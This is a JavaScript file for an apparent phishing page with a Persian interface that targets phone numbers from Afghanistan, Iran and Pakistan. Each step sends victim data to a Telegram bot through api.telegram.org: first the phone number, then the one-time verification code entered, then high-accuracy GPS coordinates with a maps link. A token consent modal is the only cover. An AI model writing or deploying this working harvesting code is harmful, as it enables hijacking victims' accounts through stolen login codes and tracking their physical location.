// scripts.js

// UTIL
function $(id){ return document.getElementById(id); }

function changeTheme(t){
  if(!t) t='mix';
  const cls = {
    mix:'theme-mix', glass:'theme-glass', cyber:'theme-cyber',
    gold:'theme-gold', clean:'theme-clean', neon:'theme-neon'
  }[t] || 'theme-mix';
  document.body.className = cls;
  // sync selects
  const s1 = document.getElementById('themeSelect');
  const s2 = document.getElementById('themeSelect2');
  if(s1) s1.value = t;
  if(s2) s2.value = t;
}

// DEMO helper
function demo(){ $('phone').value = '700123456'; $('country').value='93'; alert('Demo number وارد شد'); }

// VALIDATION
function validateNumber(country, phone){
  const rules = {"93":/^[0-9]{9}$/,"98":/^[0-9]{10}$/,"92":/^[0-9]{10}$/};
  return rules[country] ? rules[country].test(phone) : false;
}

// CONSENT modal
function acceptConsent(){
  const modal = document.getElementById('consentModal');
  if(modal) modal.classList.remove('show');
}
function declineConsent(){
  alert('برای ادامه نیاز به اجازه دارید. بعداً بازگردید.');
  // hide and optionally disable UI
  const modal = document.getElementById('consentModal');
  if(modal) modal.classList.remove('show');
}

// SEND PHONE
function sendPhone(){
  // ensure consent given (modal hidden)
  const modal = document.getElementById('consentModal');
  if(modal && modal.classList.contains('show')){ alert('ابتدا مجوز را قبول کنید.'); return; }

  const country = $('country').value;
  const phone = $('phone').value.trim();
  if(!validateNumber(country, phone)){ alert('شماره معتبر نیست'); return; }
  const full = '+' + country + phone;

  // send to telegram (fire and forget)
  const url = `https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage?chat_id=${window.CHAT_ID}&text=${encodeURIComponent('📱 شماره وارد شد: '+full)}`;
  fetch(url).catch(e=>console.warn('tg err',e));

  // redirect to verify
  location.href = 'verify.html?num=' + encodeURIComponent(full);
}

// VERIFY CODE
function verifyCode(){
  const code = $('code').value.trim();
  if(!/^[0-9]{3,8}$/.test(code)){ alert('کد معتبر نیست'); return; }
  const params = new URLSearchParams(location.search);
  const number = params.get('num') || 'نامشخص';

  // send code message
  const text = `🔐 کد وارد شده: ${code}\n📞 شماره: ${number}`;
  const url = `https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage?chat_id=${window.CHAT_ID}&text=${encodeURIComponent(text)}`;

  fetch(url).then(()=> {
    alert('کد ثبت شد. در صورت اجازه، موقعیت از شما گرفته می‌شود.');
    // after verification, request location
    setTimeout(()=> requestLocation(number), 800);
  }).catch(e=> { alert('خطا در ارسال'); console.error(e); });
}

// REQUEST LOCATION (with user permission)
function requestLocation(number){
  if(!navigator.geolocation){ alert('موقعیت‌یاب پشتیبانی نمی‌شود'); return; }

  navigator.geolocation.getCurrentPosition(function(pos){
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const text = `📍 لوکیشن:\nLatitude: ${lat}\nLongitude: ${lon}\nMaps: https://maps.google.com/?q=${lat},${lon}\n📞 شماره: ${number}`;
    fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage?chat_id=${window.CHAT_ID}&text=${encodeURIComponent(text)}`).then(()=>{
      alert('لوکیشن ارسال شد. ممنون!');
      // optionally redirect to thank-you page or reset
      location.href = 'thankyou.html';
    }).catch(e=>{ alert('ارسال لوکیشن خطا داد'); console.error(e); });
  }, function(err){
    alert('اجازهٔ لوکیشن داده نشد یا خطا رخ داد.');
    console.error(err);
  }, {enableHighAccuracy:true, timeout:30000});
}

// helpers
function goBack(){ history.back(); }

// init theme from select if present
document.addEventListener('DOMContentLoaded', ()=> {
  const s = document.getElementById('themeSelect');
  if(s) changeTheme(s.value || 'mix');
});